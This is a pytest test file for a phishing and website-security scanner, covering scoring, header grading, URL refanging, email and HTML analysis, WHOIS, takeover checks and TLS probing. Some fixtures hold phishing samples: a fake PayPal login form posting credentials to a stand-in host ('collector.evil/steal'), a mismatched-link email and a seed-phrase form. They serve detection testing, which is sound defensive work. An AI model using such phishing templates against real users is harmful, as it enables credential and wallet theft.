import json
import socket
import ssl
from types import SimpleNamespace

import pytest

from scanner import net
from scanner.checks import Check, ScanContext, takeover, tls, wellknown
from scanner.checks.http_check import _http_probe_url
from scanner.checks.wellknown import parse_robots, parse_security_txt
from scanner.checks.whois_age import parse as parse_whois
from scanner.core import _run_check
from scanner.checks.headers import grade_headers, parse_cookie, parse_csp
from scanner.checks.content import analyze_html
from scanner.extract import extract_urls, parse_eml, refang
from scanner.models import Finding
from scanner.scoring import score
from scanner.utils import base58check_ok, favicon_hash, murmur3_32, shannon_entropy


# --- scoring -------------------------------------------------------------------------------

def test_score_probabilistic_combination():
    f = [Finding("a", "a", weight=0.5), Finding("b", "b", weight=0.5)]
    r = score(f, fetched=True)
    assert r["risk_score"] == 75          # 1 - 0.5*0.5 = 0.75
    assert r["verdict"] == "Likely malicious"


def test_score_never_exceeds_100():
    f = [Finding(str(i), "x", weight=0.9) for i in range(10)]
    assert score(f)["risk_score"] <= 100


@pytest.mark.parametrize("risk_weights,verdict", [
    ([], "Clean"), ([0.25], "Suspicious"), ([0.6], "Likely malicious"), ([0.9], "Malicious"),
])
def test_verdict_bands(risk_weights, verdict):
    f = [Finding(str(i), "x", weight=w) for i, w in enumerate(risk_weights)]
    assert score(f)["verdict"] == verdict


def test_trusted_damping():
    f = [Finding("x", "x", severity="medium", weight=0.5)]
    assert score(f, trusted=True)["risk_score"] < score(f, trusted=False)["risk_score"]


def test_posture_grade():
    f = [Finding("x", "x", penalty=60)]
    r = score(f, fetched=True)
    assert r["posture_score"] == 40 and r["grade"] == "F"
    assert score([], fetched=True)["grade"] == "A+"
    assert score([], fetched=False)["grade"] == "N/A"


# --- header parsing ------------------------------------------------------------------------

def test_parse_csp():
    csp = parse_csp("default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'")
    assert csp["script-src"] == ["'self'", "'unsafe-inline'"]
    assert csp["object-src"] == ["'none'"]


def test_grade_headers_flags_missing():
    rows, flags = grade_headers({}, https=True)
    fids = {f[0] for f in flags}
    assert {"headers.no_hsts", "headers.no_csp", "headers.no_xfo"} <= fids


def test_grade_headers_good_site():
    headers = {
        "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
        "Content-Security-Policy": "default-src 'self'; object-src 'none'; frame-ancestors 'none'",
        "X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff",
        "Referrer-Policy": "strict-origin-when-cross-origin", "Permissions-Policy": "geolocation=()",
    }
    rows, flags = grade_headers(headers, https=True)
    assert flags == []


def test_cookie_parse():
    c = parse_cookie("SID=abc; Secure; HttpOnly; SameSite=Lax; Path=/")
    assert c["name"] == "SID" and c["secure"] and c["httponly"] and c["samesite"] == "lax"


# --- refang / extract / eml ----------------------------------------------------------------

@pytest.mark.parametrize("dirty,clean", [
    ("hxxps://bad[.]com", "https://bad.com"),
    ("hxxp://a(dot)b(dot)com", "http://a.b.com"),
    ("https://evil[.]site[:]8080/x", "https://evil.site:8080/x"),
])
def test_refang(dirty, clean):
    assert refang(dirty) == clean


def test_extract_urls_from_text():
    text = "see hxxps://phish[.]tld/login and www.foo.com but not plain text"
    urls = extract_urls(text)
    assert "https://phish.tld/login" in urls
    assert any(u.startswith("https://www.foo.com") for u in urls)


def test_eml_link_text_mismatch():
    eml = (b"From: service@paypal-alerts.com\r\nTo: victim@x.com\r\nSubject: Verify\r\n"
           b"Content-Type: text/html\r\n\r\n"
           b"<html><body><a href='http://evil.example/login'>https://www.paypal.com/signin</a></body></html>")
    info = parse_eml(eml)
    assert len(info["links"]) == 1
    assert info["links"][0]["mismatch"] is True
    assert any("display" in w or "point" in w for w in info["warnings"])


# --- content analysis ----------------------------------------------------------------------

def test_content_offsite_password_form():
    html = """<html><head><title>Sign in to PayPal</title></head><body>
      <form action="http://collector.evil/steal" method="post">
        <input type="text" name="email"><input type="password" name="pass"></form></body></html>"""
    s = analyze_html(html, "https://paypal-login.tk/", "paypal-login.tk")
    fids = {f.id for f in s.findings}
    assert "content.form_offsite" in fids or "content.password_over_http" in fids
    assert "content.brand_login" in fids  # title claims PayPal on a non-PayPal domain


def test_content_seed_phrase():
    html = """<form><input name="recovery phrase" type="text"></form>"""
    s = analyze_html(html, "https://wallet-restore.xyz/", "wallet-restore.xyz")
    assert "content.seed_phrase" in {f.id for f in s.findings}


def test_content_clean_page():
    html = "<html><head><title>My Blog</title></head><body><p>Hello world</p></body></html>"
    s = analyze_html(html, "https://myblog.example/", "myblog.example")
    assert [f for f in s.findings if f.weight > 0.2] == []


# --- utils ---------------------------------------------------------------------------------

def test_murmur3_matches_reference_values():
    assert murmur3_32(b"") == 0
    assert murmur3_32(b"hello") == 613153351


def test_favicon_hash_is_signed_int():
    h = favicon_hash(b"\x89PNG\r\n fake icon bytes")
    assert -2**31 <= h < 2**31


def test_entropy():
    assert shannon_entropy("aaaa") == 0.0
    assert shannon_entropy("abcd") == 2.0


def test_btc_checksum():
    assert base58check_ok("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", {0, 5})     # genesis address
    assert not base58check_ok("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb", {0, 5})  # bad checksum


# --- HTTP / headers ------------------------------------------------------------------------

@pytest.mark.parametrize("url,expected", [
    ("https://example.com/x?y=1", "http://example.com/"),
    ("https://example.com:443/", "http://example.com/"),
    ("https://user:pw@example.com/", "http://example.com/"),   # credentials are never sent to the probe
    ("https://example.com:8443/", None),                       # custom HTTPS port: port 80 says nothing
    ("https://[2606:4700::1]/", "http://[2606:4700::1]/"),
])
def test_http_probe_url(url, expected):
    assert _http_probe_url(ScanContext(url)) == expected


def test_csp_without_script_policy_is_flagged():
    _, flags = grade_headers({"Content-Security-Policy": "frame-ancestors 'none'"}, True)
    assert "headers.csp_no_script_policy" in {f[0] for f in flags}
    _, flags = grade_headers({"Content-Security-Policy": "default-src 'self'; object-src 'none'"}, True)
    assert "headers.csp_no_script_policy" not in {f[0] for f in flags}


def test_redirect_with_invalid_port_is_a_clean_error():
    with pytest.raises(net.ResolveError):
        net.safe_fetch("https://example.com:99999/")


def test_check_returning_none_is_reported_not_crashing():
    section, err, _ = _run_check(Check("x", "X", lambda ctx: None), None)
    assert section is None and "expected Section" in err


# --- CLI output ----------------------------------------------------------------------------

def test_cli_multi_json_is_one_valid_document(tmp_path):
    import cli
    results = [{"id": i, "url": f"https://{d}/", "registered_domain": d, "error": "offline"}
               for i, d in (("a1", "a.test"), ("b2", "b.test"))]
    written = cli.write_outputs(results, ["json", "md"], str(tmp_path))
    data = json.loads((tmp_path / "scan_report.json").read_text(encoding="utf-8"))
    assert [r["id"] for r in data] == ["a1", "b2"]
    assert len([p for p in written if p.endswith(".md")]) == 2  # one Markdown report per target


# --- WHOIS / takeover ----------------------------------------------------------------------

def test_whois_privacy_only_from_contact_lines():
    disclaimer = "Domain Name: X.COM\nCreation Date: 2001-01-01\n>>> see our privacy policy <<<\n"
    assert parse_whois(disclaimer)["privacy"] is False
    assert parse_whois(disclaimer + "Registrant Name: REDACTED FOR PRIVACY\n")["privacy"] is True


@pytest.mark.parametrize("cname,matched", [
    ("myname.github.io", True),
    ("github.io.attacker.test", False),   # used to match as a plain substring
    ("bucket.s3-website-us-east-1.amazonaws.com", True),
])
def test_takeover_cname_matching(monkeypatch, cname, matched):
    monkeypatch.setattr(takeover, "nxdomain", lambda name: False)
    ctx = SimpleNamespace(host="www.site.test", fetch=None, sections={"dns": {"records": {"CNAME": [cname]}}})
    assert ("service" in takeover.run(ctx).data) is matched


# --- security.txt / robots.txt -------------------------------------------------------------

def test_parse_security_txt():
    info = parse_security_txt("# comment\nContact: mailto:security@example.com\nContact: https://example.com/r\n"
                              "Expires: 2030-01-01T00:00:00z\nPolicy: https://example.com/policy\n")
    assert info["contact"] == ["mailto:security@example.com", "https://example.com/r"]
    assert info["expires_dt"].year == 2030
    assert {"contact", "expires", "policy"} <= set(info["fields"])


def test_parse_robots_flags_sensitive_paths():
    r = parse_robots("User-agent: *\nDisallow: /wp-admin/\nDisallow: /backup.zip\nDisallow: /blog\nDisallow:\n"
                     "Sitemap: https://x.test/sitemap.xml\n")
    assert r["disallow"] == ["/wp-admin/", "/backup.zip", "/blog"]
    assert r["sensitive"] == ["/wp-admin/", "/backup.zip"]
    assert r["sitemaps"] == ["https://x.test/sitemap.xml"]


def test_wellknown_flags(monkeypatch):
    files = {"https://x.test/.well-known/security.txt": "Contact: mailto:a@x.test\nExpires: 2020-01-01T00:00:00Z\n"}
    monkeypatch.setattr(wellknown, "_fetch_text", files.get)
    found = {f.id for f in wellknown.run(SimpleNamespace(fetch=SimpleNamespace(final_url="https://x.test/p"))).findings}
    assert found == {"wellknown.security_txt_expired"}
    monkeypatch.setattr(wellknown, "_fetch_text", lambda url: None)
    found = {f.id for f in wellknown.run(SimpleNamespace(fetch=SimpleNamespace(final_url="https://x.test/p"))).findings}
    assert found == {"wellknown.no_security_txt"}


# --- TLS protocol probing ------------------------------------------------------------------

def test_tls_probe_classifies_answers(monkeypatch):
    def fake_handshake(host, port, ip, verify, min_v=None, max_v=None, ciphers=None, timeout=6):
        if min_v == ssl.TLSVersion.TLSv1:
            return b"", "TLSv1", None              # accepted
        if min_v == ssl.TLSVersion.TLSv1_1:
            raise ConnectionResetError()            # server hung up: refused
        if min_v == ssl.TLSVersion.TLSv1_3:
            raise socket.timeout()                  # no answer: unknown
        if ciphers and not ciphers.startswith(("DEFAULT", "aNULL")):
            raise ssl.SSLError(1, "handshake failure")
        return b"", "TLSv1.2", None

    monkeypatch.setattr(tls, "_context", lambda *a, **k: None)  # pretend this OpenSSL can offer everything
    monkeypatch.setattr(tls, "_handshake", fake_handshake)
    protocols, weak = tls.probe_protocols("x.test", 443, "203.0.113.1")
    assert protocols == {"TLSv1": True, "TLSv1.1": False, "TLSv1.2": True, "TLSv1.3": None}
    assert weak == {"RC4": False, "3DES": False, "NULL": False, "EXPORT": False, "anonymous": True}
